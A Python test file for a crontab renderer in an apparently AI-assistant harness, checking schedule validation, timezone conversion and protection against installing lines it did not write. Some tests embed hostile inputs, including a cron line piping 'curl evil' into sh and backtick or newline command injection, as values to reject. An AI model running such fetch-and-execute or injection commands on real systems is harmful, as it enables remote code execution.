from __future__ import annotations

import json
import subprocess
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace
from zoneinfo import ZoneInfo

import pytest

import server.schedules as schedules_module
from server.schedules import (
    MAX_DAILY_FIRINGS,
    MAX_ENTRIES,
    install,
    load,
    pin_one_offs,
    prune_fired,
    render,
    sync_after_turn,
)


def _write_store(root: Path, entries: list[dict], *, timezone: str = "America/Halifax") -> Path:
    cron_dir = root / "cron"
    cron_dir.mkdir(exist_ok=True)
    path = cron_dir / "schedules.json"
    path.write_text(json.dumps({"timezone": timezone, "entries": entries}))
    return path


def _entry(**overrides) -> dict:
    value = {"id": "costco", "at": "2099-08-28T14:00", "notify": "Go to Costco"}
    value.update(overrides)
    return value


def test_load_and_render_byte_exact_crontab(tmp_path, monkeypatch, system_zone):
    system_zone("America/Edmonton")
    monkeypatch.setattr(
        schedules_module,
        "settings",
        SimpleNamespace(
            working_dir=Path("/home/marlow/marlow-identity"),
            data_dir=Path("/home/marlow/.marlow/data"),
            log_dir=Path("/home/marlow/.marlow/logs"),
            claude_bin="/home/marlow/.local/bin/claude",
            server_repo=Path("/home/marlow/marlow-server"),
            internal_socket_path=Path("/home/marlow/.marlow/run/internal.sock"),
            cron_entrypoint=Path("/opt/marlow/cron/entrypoint.py"),
        ),
    )
    cron_dir = tmp_path / "cron"
    cron_dir.mkdir()
    (cron_dir / "morning-scan.md").write_text("Do the morning scan.\n")
    path = _write_store(
        tmp_path,
        [
            {"id": "morning", "cron": "45 7 * * *", "job": "morning-scan"},
            _entry(),
            {
                "id": "rebates",
                "cron": "0 21 * * 0",
                "prompt": "Research heat pump rebates; brief me in the morning.",
            },
        ],
    )

    parsed = load(path)

    assert parsed is not None
    assert render(parsed) == (
        'MAILTO=""\n'
        "MARLOW_WORKING_DIR=/home/marlow/marlow-identity\n"
        "MARLOW_DATA_DIR=/home/marlow/.marlow/data\n"
        "MARLOW_LOG_DIR=/home/marlow/.marlow/logs\n"
        "MARLOW_CLAUDE_BIN=/home/marlow/.local/bin/claude\n"
        "MARLOW_SERVER_REPO=/home/marlow/marlow-server\n"
        "MARLOW_INTERNAL_SOCKET=/home/marlow/.marlow/run/internal.sock\n"
        "MARLOW_CRON_ENTRYPOINT=/opt/marlow/cron/entrypoint.py\n"
        "\n"
        # Halifax is three hours ahead of Edmonton, and cron is told the
        # Edmonton time. No CRON_TZ line: this cron ignores it.
        "45 4 * * *  /usr/bin/python3 /opt/marlow/cron/entrypoint.py morning-scan\n"
        "0 11 28 8 *  /usr/bin/python3 /opt/marlow/cron/entrypoint.py --entry costco\n"
        "0 18 * * 0  /usr/bin/python3 /opt/marlow/cron/entrypoint.py --entry rebates\n"
    )
    assert "CRON_TZ" not in render(parsed)


def test_render_uses_configured_paths_and_rejects_line_injection(tmp_path, monkeypatch):
    path = _write_store(tmp_path, [])
    parsed = load(path)
    assert parsed is not None

    configured = SimpleNamespace(
        working_dir=Path("/srv/marlow/identity"),
        data_dir=Path("/srv/marlow/state"),
        log_dir=Path("/var/log/marlow"),
        claude_bin="/opt/claude/bin/claude",
        server_repo=Path("/srv/marlow/server"),
        internal_socket_path=Path("/srv/marlow/run/internal.sock"),
        cron_entrypoint=Path("/opt/marlow/instances/taylor/cron/entrypoint.py"),
    )
    monkeypatch.setattr(schedules_module, "settings", configured)

    rendered = render(parsed)
    assert "MARLOW_WORKING_DIR=/srv/marlow/identity\n" in rendered
    assert "MARLOW_DATA_DIR=/srv/marlow/state\n" in rendered
    assert "MARLOW_LOG_DIR=/var/log/marlow\n" in rendered
    assert "MARLOW_CLAUDE_BIN=/opt/claude/bin/claude\n" in rendered
    assert "MARLOW_SERVER_REPO=/srv/marlow/server\n" in rendered
    # The socket too: without it a second instance's cron posts to the
    # default, which is the first instance's (docs/tasks/marlow-for-taylor.md).
    assert "MARLOW_INTERNAL_SOCKET=/srv/marlow/run/internal.sock\n" in rendered

    configured.working_dir = Path("/safe\n* * * * * injected")
    with pytest.raises(schedules_module.ScheduleValidationError):
        render(parsed)


@pytest.mark.parametrize("bad_id", ["semi;colon", "tick`cmd`", "two words", "path/name", "", "a" * 41])
def test_entry_id_is_allowlisted(tmp_path, bad_id):
    assert load(_write_store(tmp_path, [_entry(id=bad_id)])) is None


@pytest.mark.parametrize(
    "cron",
    [
        "0 12 * *",                 # four fields
        "0 12 * * * extra",         # six fields
        "0 12 * * %",               # cron's stdin metacharacter
        "60 12 * * *",              # minute out of range
        "0 24 * * *",               # hour out of range
        "0 12 0 * *",               # day out of range
        "0 12 * 13 *",              # month out of range
        "0 12 * * 8",               # weekday out of range
        "0 12 * * */0",             # zero step
        "0 12 10-1 * *",            # reversed range
        "*/14 * * * *",             # faster than the floor
        "0,10 * * * *",             # list also faster than the floor
    ],
)
def test_cron_expression_rejects_bad_or_too_frequent_shapes(tmp_path, cron):
    entry = _entry(cron=cron)
    entry.pop("at")
    assert load(_write_store(tmp_path, [entry])) is None


@pytest.mark.parametrize("cron", ["*/15 * * * *", "0,15,30,45 * * * *", "0 7 * * *"])
def test_cron_expression_accepts_frequency_floor_and_slower(tmp_path, cron):
    entry = _entry(cron=cron)
    entry.pop("at")
    assert load(_write_store(tmp_path, [entry])) is not None


@pytest.mark.parametrize(
    "at",
    [
        "2099-08-28T14:00Z",
        "2099-08-28T14:00-03:00",
        "2099-08-28T14:00:00",
        "2099-02-30T14:00",
        "2099-8-28T14:00",
    ],
)
def test_at_is_strict_offset_free_local_datetime(tmp_path, at):
    assert load(_write_store(tmp_path, [_entry(at=at)])) is None


def test_unknown_timezone_rejects_whole_store(tmp_path):
    assert load(_write_store(tmp_path, [_entry()], timezone="Mars/Olympus_Mons")) is None


def test_more_than_entry_cap_rejects_whole_store(tmp_path):
    entries = [
        {"id": f"entry-{i}", "at": f"2099-09-{(i % 28) + 1:02d}T14:00", "notify": str(i)}
        for i in range(MAX_ENTRIES + 1)
    ]
    assert load(_write_store(tmp_path, entries)) is None


def test_entries_legal_alone_reject_the_store_once_they_exceed_the_daily_budget(tmp_path):
    """The per-entry floor bounds ONE expression, not thirty of them.

    Each of these sits exactly on the 15-minute floor and passes
    _validate_cron on its own; together they are 8 x 96 turns a day.
    """
    entries = [
        {"id": f"entry-{i}", "cron": "*/15 * * * *", "notify": str(i)} for i in range(8)
    ]
    assert load(_write_store(tmp_path, entries)) is None


def test_a_store_at_the_daily_budget_is_accepted(tmp_path):
    entry = {"id": "tick", "cron": "*/15 * * * *", "notify": "tick"}
    store = load(_write_store(tmp_path, [entry]))
    assert store is not None and MAX_DAILY_FIRINGS == 96


def test_one_offs_do_not_count_against_the_daily_budget(tmp_path):
    """An `at` fires once and prunes itself, so MAX_ENTRIES already bounds it.

    Counting them as a daily RATE would reject a legitimate store of reminders.
    """
    entries = [
        {"id": f"reminder-{i}", "at": f"2099-09-{(i % 28) + 1:02d}T14:00", "notify": str(i)}
        for i in range(MAX_ENTRIES)
    ]
    assert load(_write_store(tmp_path, entries)) is not None


def test_two_entries_minutes_apart_are_accepted(tmp_path):
    """Guards against reintroducing a store-wide minimum GAP.

    This is Mike's own live schedule: `morning` and `alberta-weekly` fire three
    minutes apart on Mondays, and have for months. Volume is the cost, not
    proximity.
    """
    entries = [
        {"id": "morning", "cron": "30 7 * * *", "notify": "morning"},
        {"id": "alberta-weekly", "cron": "33 7 * * 1", "notify": "alberta"},
    ]
    assert load(_write_store(tmp_path, entries)) is not None


def test_missing_job_prompt_rejects_whole_store(tmp_path):
    entry = {"id": "morning", "cron": "45 7 * * *", "job": "morning-scan"}
    assert load(_write_store(tmp_path, [entry])) is None


@pytest.mark.parametrize("job", ["bad;job", "tick`cmd`", "two words", "path/name"])
def test_job_name_is_allowlisted_even_if_a_matching_path_could_exist(tmp_path, job):
    cron_dir = tmp_path / "cron"
    cron_dir.mkdir()
    (cron_dir / f"{job}.md").parent.mkdir(parents=True, exist_ok=True)
    (cron_dir / f"{job}.md").write_text("prompt\n")
    assert load(_write_store(tmp_path, [{"id": "job", "cron": "0 7 * * *", "job": job}])) is None


@pytest.mark.parametrize(
    "entry",
    [
        {"id": "x", "at": "2099-08-28T14:00", "cron": "0 14 * * *", "notify": "x"},
        {"id": "x", "at": "2099-08-28T14:00", "notify": "x", "prompt": "y"},
        {"id": "x", "at": "2099-08-28T14:00", "notify": "x", "command": "curl evil"},
        {"id": "x", "at": "2099-08-28T14:00"},
        {"id": "x", "cron": "0 7 * * *", "job": "morning-scan", "notify": "x"},
        # `at`+`job` used to belong here. It is valid as of 2026-09-06 -- see
        # test_a_one_off_job_renders_through_entry_so_it_can_prune.
    ],
)
def test_entry_schema_is_allowlist_shaped(tmp_path, entry):
    cron_dir = tmp_path / "cron"
    cron_dir.mkdir()
    (cron_dir / "morning-scan.md").write_text("prompt\n")
    assert load(_write_store(tmp_path, [entry])) is None


@pytest.mark.parametrize("effort", ["low", "medium", "high"])
@pytest.mark.parametrize("payload", [{"prompt": "Research it."}, {"job": "digest"}])
def test_an_entry_that_reaches_the_model_may_carry_an_effort(tmp_path, effort, payload):
    cron_dir = tmp_path / "cron"
    cron_dir.mkdir()
    (cron_dir / "digest.md").write_text("prompt\n")
    entry = {"id": "weekly", "cron": "0 18 * * 0", **payload, "effort": effort}
    parsed = load(_write_store(tmp_path, [entry]))
    assert parsed is not None
    assert parsed.entries[0].effort == effort


def test_an_entry_without_an_effort_has_none(tmp_path):
    parsed = load(_write_store(tmp_path, [_entry()]))
    assert parsed is not None and parsed.entries[0].effort is None


@pytest.mark.parametrize("effort", ["max", "High", "", None, 3, ["high"], "high "])
def test_an_unknown_effort_rejects_whole_store(tmp_path, effort):
    entry = {"id": "weekly", "cron": "0 18 * * 0", "prompt": "Research it.", "effort": effort}
    assert load(_write_store(tmp_path, [entry, _entry()])) is None


def test_a_reminder_cannot_carry_an_effort(tmp_path):
    """A notify entry never reaches the model, so an effort on one is a
    misunderstanding the validator refuses rather than ignores."""
    assert load(_write_store(tmp_path, [_entry(effort="low")])) is None


def test_duplicate_entry_ids_reject_whole_store(tmp_path):
    assert load(_write_store(tmp_path, [_entry(), _entry()])) is None


def test_prune_removes_exactly_one_entry_without_reordering_survivors(tmp_path):
    entries = [
        _entry(id="first", notify="first"),
        _entry(id="fired", notify="fired"),
        _entry(id="last", notify="last"),
    ]
    path = _write_store(tmp_path, entries)

    assert prune_fired(path, "fired") is True

    stored = json.loads(path.read_text())
    assert stored == {"timezone": "America/Halifax", "entries": [entries[0], entries[2]]}
    assert path.read_text().endswith("\n")


def test_invalid_store_never_invokes_crontab_and_sync_never_raises(tmp_path, monkeypatch):
    path = tmp_path / "cron" / "schedules.json"
    path.parent.mkdir()
    path.write_text("not json")
    monkeypatch.setattr(schedules_module, "SCHEDULES_PATH", path)
    monkeypatch.setattr(
        schedules_module.subprocess,
        "run",
        lambda *args, **kwargs: pytest.fail("invalid schedules must leave the installed crontab alone"),
    )

    assert sync_after_turn() is None


def test_install_pipes_the_table_over_stdin_never_via_a_named_file(monkeypatch):
    """`crontab -`, not `crontab <temp file>`.

    The temp file the first version used landed in the unit's /tmp, which the
    sandbox shares read-write under the SAME uid -- so any `marlow` process
    could rewrite it between the write and the exec and the harness would
    install a table it never rendered, defeating every guarantee in the module
    (/security-review 2026-08-30). A pipe has no name to race for.
    """
    calls = []

    def fake_run(argv, **kwargs):
        calls.append((argv, kwargs))
        if argv == ["crontab", "-l"]:
            # Renderer-owned, or install() now refuses to replace it.
            return subprocess.CompletedProcess(argv, 0, _RENDERER_OWNED, "")
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(schedules_module.subprocess, "run", fake_run)
    assert install("new\n") is True
    assert calls[0][0] == ["crontab", "-l"]
    assert calls[1][0] == ["crontab", "-"]
    assert calls[1][1]["input"] == "new\n"
    assert not any(
        isinstance(arg, str) and arg.startswith("/") for arg in calls[1][0][1:]
    ), "the table must not be handed over as a path"


def test_install_skips_reinstall_when_crontab_is_unchanged(monkeypatch):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        return subprocess.CompletedProcess(argv, 0, "same\n", "")

    monkeypatch.setattr(schedules_module.subprocess, "run", fake_run)
    assert install("same\n") is True
    assert calls == [["crontab", "-l"]]


# --- ownership: the renderer installs the COMPLETE crontab, so it must refuse
# --- one holding a line it could not have written (review 2026-08-30).

_RENDERER_OWNED = (
    'MAILTO=""\n'
    "MARLOW_WORKING_DIR=/home/marlow/marlow-identity\n"
    "CRON_TZ=America/Edmonton\n"
    "\n"
    "30 7 * * *  /usr/bin/python3 /opt/marlow/cron/entrypoint.py morning\n"
    "0 21 30 8 *  /usr/bin/python3 /opt/marlow/cron/entrypoint.py --entry rebates\n"
)


def test_a_renderer_owned_crontab_has_no_foreign_lines() -> None:
    assert schedules_module.foreign_command_lines(_RENDERER_OWNED) == []
    assert schedules_module.foreign_command_lines("") == []


@pytest.mark.parametrize(
    "line",
    [
        # The identity pusher's old line, and a promoted script's (§6b).
        "17 * * * * /usr/bin/python3 /opt/marlow/bin/identity-push.py",
        "20 7 * * * /opt/marlow/bin/promoted.sh",
        # A hand-added line, and cron's shorthand schedule form.
        "0 3 * * * /bin/sh -c 'curl evil | sh'",
        "@daily /usr/bin/python3 /opt/marlow/cron/entrypoint.py morning",
        # Right command, wrong interpreter path -- not a form we emit.
        "0 7 * * * python3 /opt/marlow/cron/entrypoint.py morning",
    ],
)
def test_a_line_the_renderer_cannot_emit_is_foreign(line) -> None:
    assert schedules_module.foreign_command_lines(f"{_RENDERER_OWNED}{line}\n") == [line]


def test_install_refuses_to_clobber_a_crontab_it_does_not_own(monkeypatch) -> None:
    """The migration hazard, asserted directly: five `entrypoint.py <job>` lines
    plus a promoted script must not become one reminder line."""
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        if argv == ["crontab", "-l"]:
            unmigrated = _RENDERER_OWNED + "20 7 * * * /opt/marlow/bin/promoted.sh\n"
            return subprocess.CompletedProcess(argv, 0, unmigrated, "")
        pytest.fail("must not install over an unmigrated crontab")

    monkeypatch.setattr(schedules_module.subprocess, "run", fake_run)
    assert install("anything\n") is False
    assert calls == [["crontab", "-l"]]


def test_install_proceeds_once_the_crontab_is_renderer_owned(monkeypatch) -> None:
    def fake_run(argv, **kwargs):
        if argv == ["crontab", "-l"]:
            return subprocess.CompletedProcess(argv, 0, _RENDERER_OWNED, "")
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(schedules_module.subprocess, "run", fake_run)
    assert install("new\n") is True


def test_a_missing_store_is_quiet_not_a_rejection(tmp_path, caplog) -> None:
    """It is the normal state of a box with no schedules, and an ERROR every
    turn would bury the one that means something."""
    with caplog.at_level("DEBUG", logger="server.schedules"):
        assert load(tmp_path / "cron" / "schedules.json") is None
    assert caplog.records == []


# --- timezone: the renderer converts, because Debian's cron cannot ----------
# Defect 1, found in production 2026-08-30. `CRON_TZ` is a Vixie/RH feature;
# `cron 3.0pl1-184ubuntu2` accepts the line as an ordinary variable and fires
# at box-local time regardless. Every entry below is a store time that must
# come out as a DIFFERENT system-local time.


def test_a_fractional_offset_moves_the_minute_field_too(tmp_path, system_zone):
    """Newfoundland is the reason this cannot be an hour shift."""
    system_zone("America/Edmonton")
    parsed = load(
        _write_store(
            tmp_path,
            [{"id": "physio", "cron": "30 7 * * *", "notify": "Physio"}],
            timezone="America/St_Johns",
        )
    )
    assert parsed is not None
    assert "0 4 * * *  " in render(parsed)


def test_one_expression_can_need_several_local_lines(tmp_path, system_zone):
    """A half-hour offset splits one store hour across two local ones."""
    system_zone("America/Edmonton")
    parsed = load(
        _write_store(
            tmp_path,
            [{"id": "meds", "cron": "0,30 8 * * *", "notify": "Meds"}],
            timezone="America/St_Johns",
        )
    )
    assert parsed is not None
    body = [line for line in render(parsed).splitlines() if "entrypoint.py " in line]
    assert [line.split("  ")[0] for line in body] == ["30 4 * * *", "0 5 * * *"]


def test_crossing_midnight_rotates_the_weekday(tmp_path, system_zone):
    """Monday morning in Sydney is Sunday evening in Alberta."""
    system_zone("America/Edmonton")
    parsed = load(
        _write_store(
            tmp_path,
            [{"id": "standup", "cron": "0 9 * * 1,3", "prompt": "Prep standup"}],
            timezone="Australia/Sydney",
        )
    )
    assert parsed is not None
    # 17:00 or 16:00 depending on whether Sydney is in daylight time today --
    # render's reference date is today. A hard-coded 17 failed the push gate on
    # 2026-10-04, the day Sydney's DST began.
    sydney = ZoneInfo("Australia/Sydney")
    today = datetime.now(sydney).date()
    nine = datetime(today.year, today.month, today.day, 9, tzinfo=sydney)
    hour = nine.astimezone(ZoneInfo("America/Edmonton")).hour
    assert f"0 {hour} * * 0,2  " in render(parsed)


def test_a_day_of_month_entry_that_crosses_midnight_is_rejected_by_load(tmp_path, system_zone):
    """No five-field expression says "the previous month's last day".

    Rejected at LOAD, not at render. Raised from render() it would be silent:
    the store would validate, the model would see a clean file, and every later
    render would fail -- freezing the crontab for every other entry too
    (/code-review medium, 2026-08-31).
    """
    system_zone("America/Edmonton")
    path = _write_store(
        tmp_path,
        [
            {"id": "rent", "cron": "0 9 1 * *", "notify": "Rent"},
            {"id": "fine", "cron": "0 12 * * *", "notify": "Unaffected"},
        ],
        timezone="Australia/Sydney",
    )

    assert load(path) is None, "one inexpressible entry rejects the whole store, loudly"


def test_a_near_midnight_monthly_entry_is_fine_when_it_does_not_cross(tmp_path, system_zone):
    """The refusal is about crossing a day boundary, not about day-of-month."""
    system_zone("America/Edmonton")
    parsed = load(
        _write_store(
            tmp_path,
            [{"id": "rent", "cron": "0 9 1 * *", "notify": "Rent"}],
            timezone="America/St_Johns",
        )
    )
    assert parsed is not None
    assert "30 5 1 * *  " in render(parsed)


def test_a_one_off_renders_at_its_local_instant(tmp_path, system_zone):
    system_zone("America/Edmonton")
    parsed = load(
        _write_store(
            tmp_path,
            [_entry(at="2099-08-28T22:14")],
            timezone="America/St_Johns",
        )
    )
    assert parsed is not None
    assert "44 18 28 8 *  " in render(parsed)


# --- defect 2: a pending one-off is an instant, not a wall-clock string -----


def test_pinning_resolves_a_floating_one_off_and_leaves_recurring_alone(tmp_path):
    path = _write_store(
        tmp_path,
        [
            _entry(at="2099-08-28T22:14"),
            {"id": "physio", "cron": "30 7 * * *", "notify": "Physio"},
        ],
        timezone="America/St_Johns",
    )
    parsed = load(path)
    assert parsed is not None

    pinned = pin_one_offs(path, parsed)

    stored = {entry["id"]: entry for entry in json.loads(path.read_text())["entries"]}
    assert stored["costco"]["at"] == "2099-08-28T22:14-0230"
    # A repeating schedule means "07:30 wherever I am"; following the zone is
    # the feature, so it keeps its floating form.
    assert stored["physio"]["cron"] == "30 7 * * *"
    assert pinned.entry("costco") is not None
    assert pinned.entry("costco").at == "2099-08-28T22:14-0230"


def test_pinning_is_idempotent(tmp_path):
    path = _write_store(tmp_path, [_entry(at="2099-08-28T22:14")], timezone="America/St_Johns")
    once = pin_one_offs(path, load(path))
    text = path.read_text()
    assert pin_one_offs(path, once).entries == once.entries
    assert path.read_text() == text


def test_a_pinned_one_off_survives_a_timezone_change(tmp_path, system_zone):
    """The 1:44am regression.

    A reminder set for 22:14 in Newfoundland became 22:14 in Alberta when the
    store's zone changed, and fired three and a half hours late — in the middle
    of the night, on 2026-08-30. Pinned, the zone edit cannot move it.
    """
    system_zone("America/Edmonton")
    path = _write_store(tmp_path, [_entry(at="2099-08-28T22:14")], timezone="America/St_Johns")
    pin_one_offs(path, load(path))

    stored = json.loads(path.read_text())
    stored["timezone"] = "America/Edmonton"
    path.write_text(json.dumps(stored))

    reloaded = load(path)
    assert reloaded is not None
    assert "44 18 28 8 *  " in render(reloaded)


@pytest.mark.parametrize("bad_at", ["2099-08-28T22:14-02:30", "2099-08-28T22:14Z", "2099-08-28 22:14"])
def test_only_the_canonical_pinned_spelling_is_accepted(tmp_path, bad_at):
    """The validator normalises nothing: only the harness writes the offset form."""
    assert load(_write_store(tmp_path, [_entry(at=bad_at)])) is None


def test_a_one_off_job_renders_through_entry_so_it_can_prune(tmp_path):
    """`at`+`job` was refused until 2026-09-06.

    The refusal was real: render() emitted the direct `<job-name>` form for any
    job, and a cron line carries no year, so a one-off job would fire again on
    the same date next year with nothing to remove it. Marlow reached for this
    shape twice in one session -- once directly, then again as a dated `cron`
    plus a note to itself to delete the entry later, which is the same yearless
    line with a prune no turn-scoped agent performs. Rendering it through
    --entry puts it on the pruning path instead.
    """
    cron_dir = tmp_path / "cron"
    cron_dir.mkdir()
    (cron_dir / "cabot-trail-check.md").write_text("check the trail\n")
    store = _write_store(
        tmp_path,
        [
            {"id": "daily", "cron": "0 7 * * *", "job": "cabot-trail-check"},
            {
                "id": "cabot-trail-check",
                "at": "2099-09-09T09:00",
                "job": "cabot-trail-check",
            },
        ],
    )
    schedules = load(store)
    assert schedules is not None
    lines = render(schedules).splitlines()

    # The recurring job keeps the direct form -- unchanged, and the shape
    # foreign_command_lines already knows.
    assert any(line.endswith(" cabot-trail-check") for line in lines)
    # The one-off must NOT, or it never prunes.
    assert any(line.endswith(" --entry cabot-trail-check") for line in lines)


def test_a_one_off_job_still_needs_its_prompt_file(tmp_path):
    """Allowing the pairing must not drop the check that made it safe."""
    cron_dir = tmp_path / "cron"
    cron_dir.mkdir()
    store = _write_store(
        tmp_path,
        [{"id": "x", "at": "2099-09-09T09:00", "job": "no-such-job"}],
    )
    assert load(store) is None


def test_rejection_reason_is_silent_about_a_healthy_or_absent_store(tmp_path):
    assert schedules_module.rejection_reason(tmp_path / "nothing.json") is None
    store = tmp_path / "schedules.json"
    store.write_text(
        json.dumps(
            {
                "timezone": "America/St_Johns",
                "entries": [{"id": "morning", "cron": "0 8 * * *", "notify": "up"}],
            }
        )
    )
    assert schedules_module.rejection_reason(store) is None
    assert schedules_module.load(store) is not None


def test_rejection_reason_does_not_log(tmp_path, caplog):
    """`load` already logged this on the turn that installed nothing. A second
    ERROR per turn saying the same thing is what makes one ignorable."""
    store = tmp_path / "schedules.json"
    store.write_text("{}")
    with caplog.at_level("ERROR"):
        assert schedules_module.rejection_reason(store) is not None
    assert caplog.records == []


def test_a_second_instance_runs_its_own_entrypoint_copy(tmp_path, monkeypatch, system_zone):
    """Her cron jobs run her root-owned copy, so a branch on the first
    instance never changes what her jobs run (docs/tasks/marlow-for-taylor.md);
    and the renderer still recognises its own lines under that path."""
    system_zone("UTC")
    path = _write_store(tmp_path, [{"id": "morning", "cron": "45 7 * * *", "job": "morning-scan"}])
    (tmp_path / "cron" / "morning-scan.md").write_text("scan\n")
    monkeypatch.setattr(
        schedules_module,
        "settings",
        SimpleNamespace(
            working_dir=tmp_path, data_dir=tmp_path, log_dir=tmp_path, claude_bin="/c",
            server_repo=tmp_path, internal_socket_path=tmp_path / "s",
            cron_entrypoint=Path("/opt/marlow/instances/taylor/cron/entrypoint.py"),
        ),
    )
    rendered = render(load(path))
    assert "/usr/bin/python3 /opt/marlow/instances/taylor/cron/entrypoint.py morning-scan" in rendered
    # Mirrored, so the entrypoint's own re-render (cron's env is only these
    # lines) keeps pointing at her copy.
    assert "MARLOW_CRON_ENTRYPOINT=/opt/marlow/instances/taylor/cron/entrypoint.py\n" in rendered
    assert " /opt/marlow/cron/" not in rendered
    assert schedules_module.foreign_command_lines(rendered) == []
    assert schedules_module.foreign_command_lines(
        "45 7 * * *  /usr/bin/python3 /opt/marlow/cron/entrypoint.py morning-scan\n"
    ), "the first instance's command is not this instance's to replace"


# --- the harness's own lines (docs/tasks/default-infrastructure.md tier 1) -----


def _job_lines(rendered: str) -> list[str]:
    return [line for line in rendered.splitlines() if "entrypoint.py " in line]


@pytest.mark.parametrize(
    "day_end, expected",
    [
        ("23:00", [("ideas", "30 0 * * *"), ("consolidate", "0 1 * * *")]),  # today's times
        ("02:00", [("ideas", "30 3 * * *"), ("consolidate", "0 4 * * *")]),  # a night owl
        ("21:45", [("ideas", "15 23 * * *"), ("consolidate", "45 23 * * *")]),
    ],
)
def test_plumbing_runs_after_the_day_ends_ideas_first(day_end, expected):
    assert schedules_module.plumbing_crons(day_end) == expected


def test_plumbing_renders_in_the_stores_zone_beside_the_entries(tmp_path, system_zone):
    system_zone("America/Edmonton")
    path = _write_store(tmp_path, [{"id": "morning", "cron": "0 8 * * *", "prompt": "brief"}])
    rendered = render(load(path), schedules_module.plumbing_crons("23:00"))
    # Halifax is three hours ahead of Edmonton.
    assert _job_lines(rendered)[:2] == [
        f"30 21 * * *  {schedules_module._command()} ideas",
        f"0 22 * * *  {schedules_module._command()} consolidate",
    ]
    assert len(_job_lines(rendered)) == 3
    assert schedules_module.foreign_command_lines(rendered) == []


@pytest.mark.parametrize("job", sorted(schedules_module.PLUMBING_JOBS))
def test_an_entry_may_not_schedule_a_plumbing_job(tmp_path, job):
    """Otherwise the harness and the store would both fire it."""
    (tmp_path / "cron").mkdir()
    (tmp_path / "cron" / f"{job}.md").write_text("prompt")
    path = _write_store(tmp_path, [{"id": "mine", "cron": "0 1 * * *", "job": job}])
    assert load(path) is None
    assert "runs automatically" in schedules_module.rejection_reason(path)


def test_plumbing_is_outside_the_firing_budget(tmp_path):
    """The budget bounds what the model schedules; a store at the cap still
    renders the harness's two lines on top."""
    path = _write_store(tmp_path, [{"id": "busy", "cron": "*/15 * * * *", "prompt": "poll"}])
    parsed = load(path)
    assert parsed is not None
    rendered = render(parsed, schedules_module.plumbing_crons("23:00"))
    assert sum(" ideas" in line or " consolidate" in line for line in _job_lines(rendered)) == 2


def _capture_install(monkeypatch, tmp_path, *, day_end=None):
    from server.preferences import PreferencesStore

    store = PreferencesStore(tmp_path / "preferences.json")
    if day_end is not None:
        store.update(day_end=day_end)
    monkeypatch.setattr(schedules_module, "preferences_store", store)
    installed = []
    monkeypatch.setattr(schedules_module, "install", installed.append)
    return installed


def test_with_no_store_the_overnight_jobs_still_render(tmp_path, monkeypatch):
    installed = _capture_install(monkeypatch, tmp_path, day_end="01:00")
    sync_after_turn(tmp_path / "cron" / "schedules.json")
    [text] = installed
    # No store, no zone to follow: system-local, as given.
    assert _job_lines(text) == [
        f"30 2 * * *  {schedules_module._command()} ideas",
        f"0 3 * * *  {schedules_module._command()} consolidate",
        f"0 11,14,17,20,23 * * *  {schedules_module._command()} email-flash",
    ]


def test_a_rejected_store_leaves_the_crontab_it_had(tmp_path, monkeypatch):
    """Not a plumbing-only table: that would drop every reminder over one bad
    edit. The last good table already carries the overnight lines."""
    installed = _capture_install(monkeypatch, tmp_path)
    path = _write_store(tmp_path, [{"id": "Bad Id", "cron": "0 1 * * *", "prompt": "x"}])
    sync_after_turn(path)
    assert installed == []


def test_sync_renders_the_preferred_day(tmp_path, monkeypatch, system_zone):
    system_zone("America/Halifax")
    installed = _capture_install(monkeypatch, tmp_path, day_end="22:00")
    path = _write_store(tmp_path, [])
    sync_after_turn(path)
    [text] = installed
    assert _job_lines(text) == [
        f"30 23 * * *  {schedules_module._command()} ideas",
        f"0 0 * * *  {schedules_module._command()} consolidate",
        # One line per local hour, as for any entry (`_recurring_lines`).
        f"0 11 * * *  {schedules_module._command()} email-flash",
        f"0 14 * * *  {schedules_module._command()} email-flash",
        f"0 17 * * *  {schedules_module._command()} email-flash",
        f"0 20 * * *  {schedules_module._command()} email-flash",  # exactly 2h before the end
    ]


@pytest.mark.parametrize(
    "start, end, every, expected",
    [
        ("08:00", "23:00", 3, "0 11,14,17,20 * * *"),  # every box's schedule before
        ("07:30", "23:00", 3, "30 10,13,16,19 * * *"),  # Mike's box
        ("08:00", "23:00", 6, "0 14,20 * * *"),
        ("08:00", "23:00", 1, "0 9,10,11,12,13,14,15,16,17,18,19,20,21 * * *"),
        ("10:00", "02:00", 3, "0 13,16,19,22 * * *"),  # a night owl: crosses midnight
        ("10:00", "02:00", 4, "0 14,18,22 * * *"),  # 02:00 is inside the 2h margin
    ],
)
def test_checkins_run_inside_the_day(start, end, every, expected):
    assert schedules_module.checkin_crons(start, end, every) == [("email-flash", expected)]


def test_checkins_off_render_nothing():
    # (Within the day's bounds there is always room for one: the shortest
    # day is 8h, and the longest interval 6h is exactly 2h short of it.)
    assert schedules_module.checkin_crons("08:00", "23:00", 0) == []


def test_an_entry_may_not_schedule_the_checkin(tmp_path):
    (tmp_path / "cron").mkdir()
    (tmp_path / "cron" / "email-flash.md").write_text("prompt")
    path = _write_store(tmp_path, [{"id": "flash", "cron": "0 11 * * *", "job": "email-flash"}])
    assert load(path) is None


def test_turning_checkins_off_drops_their_line(tmp_path, monkeypatch):
    installed = _capture_install(monkeypatch, tmp_path)
    schedules_module.preferences_store.update(checkin_every_hours=0)
    sync_after_turn(_write_store(tmp_path, []))
    [text] = installed
    assert not any("email-flash" in line for line in _job_lines(text))
